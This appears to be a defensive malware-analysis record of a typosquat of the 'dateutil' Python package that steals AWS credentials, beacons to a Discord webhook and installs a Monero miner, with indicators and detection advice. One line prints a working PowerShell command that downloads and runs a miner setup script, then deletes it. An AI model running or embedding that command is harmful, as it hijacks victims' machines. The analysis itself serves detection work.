package_info.package_versions: latest versions as of this week (exact versions not specified)
package_info.why_malicious: The package is a typosquat of the legitimate 'dateutil' library and contains code that mines Monero cryptocurrency on the victim's machine and exfiltrates AWS credentials, targeting all major operating systems (Windows, Linux, macOS).

execution_context.trigger: import-time or runtime (likely executed on package import or as part of __init__)

malicious_snippets.code_behavior: Executes a shell command that first reads and outputs the contents of the AWS credentials file, then downloads and executes a Monero cryptominer installation script from a remote server.

malice_analysis.why_suspicious: The code exfiltrates sensitive AWS credentials and installs a cryptocurrency miner from an external source.
malice_analysis.violated_expectations: A date/time utility library should never access credential files or execute remote shell scripts.
malice_analysis.similar_legitimate_use: None; legitimate packages should not access credentials or install miners.
key_indicators: Remote script execution via curl and bash

malicious_snippets.code_behavior: Same as snippet_1, but executed on macOS systems.

malice_analysis.why_suspicious: Same as above; exfiltrates credentials and installs a cryptominer.

malicious_snippets.code_snippet: system_info=subprocess.Popen("powershell -Command \"$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.bat', $tempfile); & $tempfile A7A6uVv7EZFDAKcnZkG1fNpRMDSbt0TzzWhf1LCJi3K4iH2S9jVCfnFsgkVoDa5De62WqAXUcSEz1Hgu7b1LnvBTpu; Remove-Item -Force $tempfile\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: Downloads and executes a batch file to install a Monero cryptominer on Windows, then deletes the batch file (anti-forensics).

malice_analysis.why_suspicious: Downloads and executes a remote batch file, which is a common malware technique. Deletes itself after execution to evade detection.
malice_analysis.violated_expectations: A date/time utility should not execute PowerShell or download and run batch files.
malice_analysis.similar_legitimate_use: Rarely, legitimate updaters may use similar patterns, but never in a date utility.
key_indicators: PowerShell remote file download and execution

malicious_snippets.code_behavior: Sends system information (including IP address and OS type) to a Discord webhook controlled by the attacker.

malice_analysis.why_suspicious: Exfiltrates system information to an external service (Discord webhook), which is a common C2/exfiltration method.
malice_analysis.violated_expectations: A date utility should not send any data to external servers.
malice_analysis.similar_legitimate_use: Error reporting or telemetry (with user consent), but not to Discord webhooks.
key_indicators: Use of Discord webhook for exfiltration

attack_chain.action: Malicious package is installed and imported by the victim (typosquatting on 'dateutil').
attack_chain.leads_to: Execution of malicious code on import or runtime.

attack_chain.action: System information (IP, OS) is collected and exfiltrated to attacker's Discord webhook.
AWS credentials are accessed and exfiltrated (Linux/macOS).
Cryptominer installation script is downloaded and executed (Linux/macOS/Windows).
attack_chain.leads_to: Victim's machine is used for Monero mining.

attack_chain.action: On Windows, the batch file used for mining is deleted after execution (anti-forensics).

behavioral_signatures: Access to ~/.aws/credentials or equivalent on import
Network requests to Discord webhooks or raw.githubusercontent.com
Execution of shell or PowerShell commands to download and run remote scripts
file_indicators: Temporary batch files created and deleted in %TEMP%
network_indicators: Outbound HTTP POSTs to Discord webhooks (discord.com/api/webhooks/...)
detection_knowledge.how_to_detect: Monitor for Python packages that access credential files or execute shell/PowerShell commands on import. Flag any network requests to Discord webhooks or raw.githubusercontent.com/MoneroOcean. Alert on unexpected installation of cryptomining binaries or scripts, especially from non-administrative Python packages. Use static analysis to detect subprocess or os.system calls referencing credential files or remote scripts.
